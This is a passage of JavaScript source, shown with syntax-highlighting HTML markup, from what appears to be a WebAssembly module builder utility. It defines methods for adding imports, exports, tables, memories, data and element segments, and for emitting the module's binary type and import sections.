  <span class="hljs-title function_">addTag</span>(<span class="hljs-params">type</span>) {
    <span class="hljs-keyword">let</span> type_index = (<span class="hljs-keyword">typeof</span> type) == <span class="hljs-string">&#x27;number&#x27;</span> ? type : <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addType</span>(type);
    <span class="hljs-keyword">let</span> tag_index = <span class="hljs-variable language_">this</span>.<span class="hljs-property">tags</span>.<span class="hljs-property">length</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">num_imported_tags</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">tags</span>.<span class="hljs-title function_">push</span>(type_index);
    <span class="hljs-keyword">return</span> tag_index;
  }

  <span class="hljs-title function_">addFunction</span>(<span class="hljs-params">name, type, arg_names</span>) {
    arg_names = arg_names || [];
    <span class="hljs-keyword">let</span> type_index = (<span class="hljs-keyword">typeof</span> type) == <span class="hljs-string">&#x27;number&#x27;</span> ? type : <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addType</span>(type);
    <span class="hljs-keyword">let</span> num_args = <span class="hljs-variable language_">this</span>.<span class="hljs-property">types</span>[type_index].<span class="hljs-property">params</span>.<span class="hljs-property">length</span>;
    <span class="hljs-keyword">if</span> (num_args &lt; arg_names.<span class="hljs-property">length</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;too many arg names provided&#x27;</span>);
    }
    <span class="hljs-keyword">if</span> (num_args &gt; arg_names.<span class="hljs-property">length</span>) {
      arg_names.<span class="hljs-title function_">push</span>(num_args - arg_names.<span class="hljs-property">length</span>);
    }
    <span class="hljs-keyword">let</span> func = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WasmFunctionBuilder</span>(<span class="hljs-variable language_">this</span>, name, type_index, arg_names);
    func.<span class="hljs-property">index</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">functions</span>.<span class="hljs-property">length</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">num_imported_funcs</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">functions</span>.<span class="hljs-title function_">push</span>(func);
    <span class="hljs-keyword">return</span> func;
  }

  <span class="hljs-title function_">addImport</span>(<span class="hljs-params"><span class="hljs-variable language_">module</span>, name, type, kind = kExternalFunction</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">functions</span>.<span class="hljs-property">length</span> != <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Imported functions must be declared before local ones&#x27;</span>);
    }
    <span class="hljs-keyword">let</span> type_index = (<span class="hljs-keyword">typeof</span> type) == <span class="hljs-string">&#x27;number&#x27;</span> ? type : <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addType</span>(type);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">imports</span>.<span class="hljs-title function_">push</span>({<span class="hljs-variable language_">module</span>, name, kind, type_index});
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">num_imported_funcs</span>++;
  }

  <span class="hljs-title function_">addImportedGlobal</span>(<span class="hljs-params"><span class="hljs-variable language_">module</span>, name, type, mutable = <span class="hljs-literal">false</span>, shared = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">globals</span>.<span class="hljs-property">length</span> != <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Imported globals must be declared before local ones&#x27;</span>);
    }
    <span class="hljs-keyword">let</span> kind = kExternalGlobal;
    <span class="hljs-keyword">let</span> o = {<span class="hljs-variable language_">module</span>, name, kind, type, mutable, shared};
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">imports</span>.<span class="hljs-title function_">push</span>(o);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">num_imported_globals</span>++;
  }

  <span class="hljs-title function_">addImportedMemory</span>(<span class="hljs-params"><span class="hljs-variable language_">module</span>, name, initial = <span class="hljs-number">0</span>, maximum, shared, is_memory64</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">memories</span>.<span class="hljs-property">length</span> !== <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(
          <span class="hljs-string">&#x27;Add imported memories before declared memories to avoid messing &#x27;</span> +
          <span class="hljs-string">&#x27;up the indexes&#x27;</span>);
    }
    <span class="hljs-keyword">let</span> mem_index = <span class="hljs-variable language_">this</span>.<span class="hljs-property">imports</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">i</span> =&gt;</span> i.<span class="hljs-property">kind</span> == kExternalMemory).<span class="hljs-property">length</span>;
    <span class="hljs-keyword">let</span> kind = kExternalMemory;
    shared = !!shared;
    is_memory64 = !!is_memory64;
    <span class="hljs-keyword">let</span> o = {<span class="hljs-variable language_">module</span>, name, kind, initial, maximum, shared, is_memory64};
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">imports</span>.<span class="hljs-title function_">push</span>(o);
    <span class="hljs-keyword">return</span> mem_index;
  }

  <span class="hljs-title function_">addImportedTable</span>(<span class="hljs-params">
      <span class="hljs-variable language_">module</span>, name, initial, maximum, type = kWasmFuncRef, shared = <span class="hljs-literal">false</span>,
      is_table64 = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">tables</span>.<span class="hljs-property">length</span> != <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Imported tables must be declared before local ones&#x27;</span>);
    }
    <span class="hljs-keyword">let</span> o = {
      <span class="hljs-variable language_">module</span>,
      name,
      <span class="hljs-attr">kind</span>: kExternalTable,
      initial,
      maximum,
      type,
      <span class="hljs-attr">shared</span>: !!shared,
      <span class="hljs-attr">is_table64</span>: !!is_table64,
    };
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">imports</span>.<span class="hljs-title function_">push</span>(o);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">num_imported_tables</span>++;
  }

  <span class="hljs-title function_">addImportedTag</span>(<span class="hljs-params"><span class="hljs-variable language_">module</span>, name, type</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">tags</span>.<span class="hljs-property">length</span> != <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Imported tags must be declared before local ones&#x27;</span>);
    }
    <span class="hljs-keyword">let</span> type_index = (<span class="hljs-keyword">typeof</span> type) == <span class="hljs-string">&#x27;number&#x27;</span> ? type : <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addType</span>(type);
    <span class="hljs-keyword">let</span> kind = kExternalTag;
    <span class="hljs-keyword">let</span> o = {<span class="hljs-variable language_">module</span>, name, kind, type_index};
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">imports</span>.<span class="hljs-title function_">push</span>(o);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">num_imported_tags</span>++;
  }

  <span class="hljs-title function_">addExport</span>(<span class="hljs-params">name, index</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">exports</span>.<span class="hljs-title function_">push</span>({<span class="hljs-attr">name</span>: name, <span class="hljs-attr">kind</span>: kExternalFunction, <span class="hljs-attr">index</span>: index});
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">addExportOfKind</span>(<span class="hljs-params">name, kind, index</span>) {
    <span class="hljs-keyword">if</span> (index === <span class="hljs-literal">undefined</span> &amp;&amp; kind != kExternalTable &amp;&amp;
        kind != kExternalMemory) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(
          <span class="hljs-string">&#x27;Index for exports other than tables/memories must be provided&#x27;</span>);
    }
    <span class="hljs-keyword">if</span> (index !== <span class="hljs-literal">undefined</span> &amp;&amp; (<span class="hljs-keyword">typeof</span> index) != <span class="hljs-string">&#x27;number&#x27;</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Index for exports must be a number&#x27;</span>)
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">exports</span>.<span class="hljs-title function_">push</span>({<span class="hljs-attr">name</span>: name, <span class="hljs-attr">kind</span>: kind, <span class="hljs-attr">index</span>: index});
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">addActiveDataSegment</span>(<span class="hljs-params">memory_index, offset, data, is_shared = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-title function_">checkExpr</span>(offset);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">data_segments</span>.<span class="hljs-title function_">push</span>({
      <span class="hljs-attr">is_active</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">is_shared</span>: is_shared,
      <span class="hljs-attr">mem_index</span>: memory_index,
      <span class="hljs-attr">offset</span>: offset,
      <span class="hljs-attr">data</span>: data
    });
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">data_segments</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>;
  }

  <span class="hljs-title function_">addPassiveDataSegment</span>(<span class="hljs-params">data, is_shared = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">data_segments</span>.<span class="hljs-title function_">push</span>({
      <span class="hljs-attr">is_active</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">is_shared</span>: is_shared, <span class="hljs-attr">data</span>: data});
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">data_segments</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>;
  }

  <span class="hljs-title function_">exportMemoryAs</span>(<span class="hljs-params">name, memory_index</span>) {
    <span class="hljs-keyword">if</span> (memory_index === <span class="hljs-literal">undefined</span>) {
      <span class="hljs-keyword">const</span> num_memories = <span class="hljs-variable language_">this</span>.<span class="hljs-property">memories</span>.<span class="hljs-property">length</span> +
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">imports</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">i</span> =&gt;</span> i.<span class="hljs-property">kind</span> == kExternalMemory).<span class="hljs-property">length</span>;
      <span class="hljs-keyword">if</span> (num_memories !== <span class="hljs-number">1</span>) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(
            <span class="hljs-string">&#x27;Pass memory index to \&#x27;exportMemoryAs\&#x27; if there is not exactly &#x27;</span> +
            <span class="hljs-string">&#x27;one memory imported or declared.&#x27;</span>);
      }
      memory_index = <span class="hljs-number">0</span>;
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">exports</span>.<span class="hljs-title function_">push</span>({<span class="hljs-attr">name</span>: name, <span class="hljs-attr">kind</span>: kExternalMemory, <span class="hljs-attr">index</span>: memory_index});
  }

  <span class="hljs-comment">// {offset} is a constant expression.</span>
  <span class="hljs-comment">// If {type} is undefined, then {elements} are function indices. Otherwise,</span>
  <span class="hljs-comment">// they are constant expressions.</span>
  <span class="hljs-title function_">addActiveElementSegment</span>(<span class="hljs-params">table, offset, elements, type, is_shared = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-title function_">checkExpr</span>(offset);
    <span class="hljs-keyword">if</span> (type != <span class="hljs-literal">undefined</span>) {
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> element <span class="hljs-keyword">of</span> elements) <span class="hljs-title function_">checkExpr</span>(element);
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">element_segments</span>.<span class="hljs-title function_">push</span>(
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">WasmElemSegment</span>(table, offset, type, elements, <span class="hljs-literal">false</span>, is_shared));
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">element_segments</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>;
  }

  <span class="hljs-comment">// If {type} is undefined, then {elements} are function indices. Otherwise,</span>
  <span class="hljs-comment">// they are constant expressions.</span>
  <span class="hljs-title function_">addPassiveElementSegment</span>(<span class="hljs-params">elements, type, is_shared = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-keyword">if</span> (type != <span class="hljs-literal">undefined</span>) {
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> element <span class="hljs-keyword">of</span> elements) <span class="hljs-title function_">checkExpr</span>(element);
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">element_segments</span>.<span class="hljs-title function_">push</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WasmElemSegment</span>(
      <span class="hljs-literal">undefined</span>, <span class="hljs-literal">undefined</span>, type, elements, <span class="hljs-literal">false</span>, is_shared));
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">element_segments</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>;
  }

  <span class="hljs-comment">// If {type} is undefined, then {elements} are function indices. Otherwise,</span>
  <span class="hljs-comment">// they are constant expressions.</span>
  <span class="hljs-title function_">addDeclarativeElementSegment</span>(<span class="hljs-params">elements, type, is_shared = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-keyword">if</span> (type != <span class="hljs-literal">undefined</span>) {
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> element <span class="hljs-keyword">of</span> elements) <span class="hljs-title function_">checkExpr</span>(element);
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">element_segments</span>.<span class="hljs-title function_">push</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WasmElemSegment</span>(
      <span class="hljs-literal">undefined</span>, <span class="hljs-literal">undefined</span>, type, elements, <span class="hljs-literal">true</span>, is_shared));
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">element_segments</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>;
  }

  <span class="hljs-title function_">appendToTable</span>(<span class="hljs-params">array</span>) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> n <span class="hljs-keyword">of</span> array) {
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> n != <span class="hljs-string">&#x27;number&#x27;</span>)
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;invalid table (entries have to be numbers): &#x27;</span> + array);
    }
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">tables</span>.<span class="hljs-property">length</span> == <span class="hljs-number">0</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addTable</span>(kWasmAnyFunc, <span class="hljs-number">0</span>);
    }
    <span class="hljs-comment">// Adjust the table to the correct size.</span>
    <span class="hljs-keyword">let</span> table = <span class="hljs-variable language_">this</span>.<span class="hljs-property">tables</span>[<span class="hljs-number">0</span>];
    <span class="hljs-keyword">const</span> base = table.<span class="hljs-property">initial_size</span>;
    <span class="hljs-keyword">const</span> table_size = base + array.<span class="hljs-property">length</span>;
    table.<span class="hljs-property">initial_size</span> = table_size;
    <span class="hljs-keyword">if</span> (table.<span class="hljs-property">has_max</span> &amp;&amp; table_size &gt; table.<span class="hljs-property">max_size</span>) {
      table.<span class="hljs-property">max_size</span> = table_size;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addActiveElementSegment</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_">wasmI32Const</span>(base), array);
  }

  <span class="hljs-title function_">setTableBounds</span>(<span class="hljs-params">min, max = <span class="hljs-literal">undefined</span></span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">tables</span>.<span class="hljs-property">length</span> != <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;The table bounds of table \&#x27;0\&#x27; have already been set.&#x27;</span>);
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addTable</span>(kWasmAnyFunc, min, max);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">startRecGroup</span>(<span class="hljs-params"></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">rec_groups</span>.<span class="hljs-title function_">push</span>({<span class="hljs-attr">start</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">types</span>.<span class="hljs-property">length</span>, <span class="hljs-attr">size</span>: <span class="hljs-number">0</span>});
  }

  <span class="hljs-title function_">endRecGroup</span>(<span class="hljs-params"></span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">rec_groups</span>.<span class="hljs-property">length</span> == <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;Did not start a recursive group before ending one&quot;</span>)
    }
    <span class="hljs-keyword">let</span> last_element = <span class="hljs-variable language_">this</span>.<span class="hljs-property">rec_groups</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">rec_groups</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>]
    <span class="hljs-keyword">if</span> (last_element.<span class="hljs-property">size</span> != <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;Did not start a recursive group before ending one&quot;</span>)
    }
    last_element.<span class="hljs-property">size</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">types</span>.<span class="hljs-property">length</span> - last_element.<span class="hljs-property">start</span>;
  }

  <span class="hljs-title function_">setName</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">setCompilationPriority</span>(<span class="hljs-params">
      function_index, compilation_priority, optimization_priority</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">compilation_priorities</span>.<span class="hljs-title function_">set</span>(function_index, {
      compilation_priority, optimization_priority
    });
  }

  <span class="hljs-comment">// `instruction_frequencies` must be an array of {offset, frequency} objects.</span>
  <span class="hljs-title function_">setInstructionFrequencies</span>(<span class="hljs-params">function_index, instruction_frequencies</span>) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(instruction_frequencies)) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;instruction_frequencies must be an array&quot;</span>);
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">instruction_frequencies</span>.<span class="hljs-title function_">set</span>(function_index, instruction_frequencies);
  }

  <span class="hljs-comment">// `call_targets` must be an array of {offset, targets} object, where</span>
  <span class="hljs-comment">// `targets` is an array of {function_index, frequency_percent} objects.</span>
  <span class="hljs-title function_">setCallTargets</span>(<span class="hljs-params">function_index, call_targets</span>) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(call_targets)) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;call_targets must be an array&quot;</span>);
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">call_targets</span>.<span class="hljs-title function_">set</span>(function_index, call_targets);
  }

  <span class="hljs-title function_">toBuffer</span>(<span class="hljs-params">debug = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-keyword">let</span> binary = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Binary</span>;
    <span class="hljs-keyword">let</span> wasm = <span class="hljs-variable language_">this</span>;

    <span class="hljs-comment">// Add header.</span>
    binary.<span class="hljs-title function_">emit_header</span>();

    <span class="hljs-comment">// Add type section.</span>
    <span class="hljs-keyword">if</span> (wasm.<span class="hljs-property">types</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">if</span> (debug) <span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;emitting types @ &#x27;</span> + binary.<span class="hljs-property">length</span>);
      binary.<span class="hljs-title function_">emit_section</span>(kTypeSectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        <span class="hljs-keyword">let</span> length_with_groups = wasm.<span class="hljs-property">types</span>.<span class="hljs-property">length</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> group <span class="hljs-keyword">of</span> wasm.<span class="hljs-property">rec_groups</span>) {
          length_with_groups -= group.<span class="hljs-property">size</span> - <span class="hljs-number">1</span>;
        }
        section.<span class="hljs-title function_">emit_u32v</span>(length_with_groups);

        <span class="hljs-keyword">let</span> rec_group_index = <span class="hljs-number">0</span>;

        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; wasm.<span class="hljs-property">types</span>.<span class="hljs-property">length</span>; i++) {
          <span class="hljs-keyword">if</span> (rec_group_index &lt; wasm.<span class="hljs-property">rec_groups</span>.<span class="hljs-property">length</span> &amp;&amp;
              wasm.<span class="hljs-property">rec_groups</span>[rec_group_index].<span class="hljs-property">start</span> == i) {
            section.<span class="hljs-title function_">emit_u8</span>(kWasmRecursiveTypeGroupForm);
            section.<span class="hljs-title function_">emit_u32v</span>(wasm.<span class="hljs-property">rec_groups</span>[rec_group_index].<span class="hljs-property">size</span>);
            rec_group_index++;
          }

          <span class="hljs-keyword">let</span> type = wasm.<span class="hljs-property">types</span>[i];
          <span class="hljs-keyword">if</span> (type.<span class="hljs-property">supertype</span> != kNoSuperType) {
            section.<span class="hljs-title function_">emit_u8</span>(type.<span class="hljs-property">is_final</span> ? kWasmSubtypeFinalForm
                                          : kWasmSubtypeForm);
            section.<span class="hljs-title function_">emit_u8</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">// supertype count</span>
            section.<span class="hljs-title function_">emit_u32v</span>(type.<span class="hljs-property">supertype</span>);
          } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!type.<span class="hljs-property">is_final</span>) {
            section.<span class="hljs-title function_">emit_u8</span>(kWasmSubtypeForm);
            section.<span class="hljs-title function_">emit_u8</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">// no supertypes</span>
          }
          <span class="hljs-keyword">if</span> (type.<span class="hljs-property">is_shared</span>) section.<span class="hljs-title function_">emit_u8</span>(kWasmSharedTypeForm);
          <span class="hljs-keyword">if</span> (type.<span class="hljs-property">describes</span> !== <span class="hljs-literal">undefined</span>) {
            section.<span class="hljs-title function_">emit_u8</span>(kWasmDescribesTypeForm);
            section.<span class="hljs-title function_">emit_u32v</span>(type.<span class="hljs-property">describes</span>);
          }
          <span class="hljs-keyword">if</span> (type.<span class="hljs-property">descriptor</span> !== <span class="hljs-literal">undefined</span>) {
            section.<span class="hljs-title function_">emit_u8</span>(kWasmDescriptorTypeForm);
            section.<span class="hljs-title function_">emit_u32v</span>(type.<span class="hljs-property">descriptor</span>);
          }
          <span class="hljs-keyword">if</span> (type <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">WasmStruct</span>) {
            section.<span class="hljs-title function_">emit_u8</span>(kWasmStructTypeForm);
            section.<span class="hljs-title function_">emit_u32v</span>(type.<span class="hljs-property">fields</span>.<span class="hljs-property">length</span>);
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> field <span class="hljs-keyword">of</span> type.<span class="hljs-property">fields</span>) {
              section.<span class="hljs-title function_">emit_type</span>(field.<span class="hljs-property">type</span>);
              section.<span class="hljs-title function_">emit_u8</span>(field.<span class="hljs-property">mutability</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>);
            }
          } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">WasmArray</span>) {
            section.<span class="hljs-title function_">emit_u8</span>(kWasmArrayTypeForm);
            section.<span class="hljs-title function_">emit_type</span>(type.<span class="hljs-property">type</span>);
            section.<span class="hljs-title function_">emit_u8</span>(type.<span class="hljs-property">mutability</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>);
          } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">WasmCont</span>) {
            section.<span class="hljs-title function_">emit_u8</span>(kWasmContTypeForm);
            section.<span class="hljs-title function_">emit_u32v</span>(type.<span class="hljs-property">type_index</span>);
          } <span class="hljs-keyword">else</span> {
            section.<span class="hljs-title function_">emit_u8</span>(kWasmFunctionTypeForm);
            section.<span class="hljs-title function_">emit_u32v</span>(type.<span class="hljs-property">params</span>.<span class="hljs-property">length</span>);
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> param <span class="hljs-keyword">of</span> type.<span class="hljs-property">params</span>) {
              section.<span class="hljs-title function_">emit_type</span>(param);
            }
            section.<span class="hljs-title function_">emit_u32v</span>(type.<span class="hljs-property">results</span>.<span class="hljs-property">length</span>);
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> result <span class="hljs-keyword">of</span> type.<span class="hljs-property">results</span>) {
              section.<span class="hljs-title function_">emit_type</span>(result);
            }
          }
        }
      });
    }

    <span class="hljs-comment">// Add imports section.</span>
    <span class="hljs-keyword">if</span> (wasm.<span class="hljs-property">imports</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">if</span> (debug) <span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;emitting imports @ &#x27;</span> + binary.<span class="hljs-property">length</span>);
      binary.<span class="hljs-title function_">emit_section</span>(kImportSectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        section.<span class="hljs-title function_">emit_u32v</span>(wasm.<span class="hljs-property">imports</span>.<span class="hljs-property">length</span>);
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> imp <span class="hljs-keyword">of</span> wasm.<span class="hljs-property">imports</span>) {
          section.<span class="hljs-title function_">emit_string</span>(imp.<span class="hljs-property">module</span>);
          section.<span class="hljs-title function_">emit_string</span>(imp.<span class="hljs-property">name</span> || <span class="hljs-string">&#x27;&#x27;</span>);
          section.<span class="hljs-title function_">emit_u8</span>(imp.<span class="hljs-property">kind</span>);
          <span class="hljs-keyword">if</span> (imp.<span class="hljs-property">kind</span> == kExternalFunction ||
              imp.<span class="hljs-property">kind</span> == kExternalExactFunction) {
            section.<span class="hljs-title function_">emit_u32v</span>(imp.<span class="hljs-property">type_index</span>);
          } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (imp.<span class="hljs-property">kind</span> == kExternalGlobal) {
            section.<span class="hljs-title function_">emit_type</span>(imp.<span class="hljs-property">type</span>);
            <span class="hljs-keyword">let</span> flags = (imp.<span class="hljs-property">mutable</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) | (imp.<span class="hljs-property">shared</span> ? <span class="hljs-number">0b10</span> : <span class="hljs-number">0</span>);
            section.<span class="hljs-title function_">emit_u8</span>(flags);
          } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (imp.<span class="hljs-property">kind</span> == kExternalMemory) {
            <span class="hljs-keyword">const</span> has_max = imp.<span class="hljs-property">maximum</span> !== <span class="hljs-literal">undefined</span>;
            <span class="hljs-keyword">const</span> is_shared = !!imp.<span class="hljs-property">shared</span>;
            <span class="hljs-keyword">const</span> is_memory64 = !!imp.<span class="hljs-property">is_memory64</span>;
            <span class="hljs-keyword">let</span> limits_byte =
                (is_memory64 ? <span class="hljs-number">4</span> : <span class="hljs-number">0</span>) | (is_shared ? <span class="hljs-number">2</span> : <span class="hljs-number">0</span>) | (has_max ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>);
            section.<span class="hljs-title function_">emit_u8</span>(limits_byte);
            <span class="hljs-keyword">let</span> <span class="hljs-title function_">emit</span> = val =&gt;
                is_memory64 ? section.<span class="hljs-title function_">emit_u64v</span>(val) : section.<span class="hljs-title function_">emit_u32v</span>(val);
            <span class="hljs-title function_">emit</span>(imp.<span class="hljs-property">initial</span>);
            <span class="hljs-keyword">if</span> (has_max) <span class="hljs-title function_">emit</span>(imp.<span class="hljs-property">maximum</span>);
          } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (imp.<span class="hljs-property">kind</span> == kExternalTable) {
            section.<span class="hljs-title function_">emit_type</span>(imp.<span class="hljs-property">type</span>);
            <span class="hljs-keyword">const</span> has_max = (<span class="hljs-keyword">typeof</span> imp.<span class="hljs-property">maximum</span>) != <span class="hljs-string">&#x27;undefined&#x27;</span>;
            <span class="hljs-keyword">const</span> is_shared = !!imp.<span class="hljs-property">shared</span>;
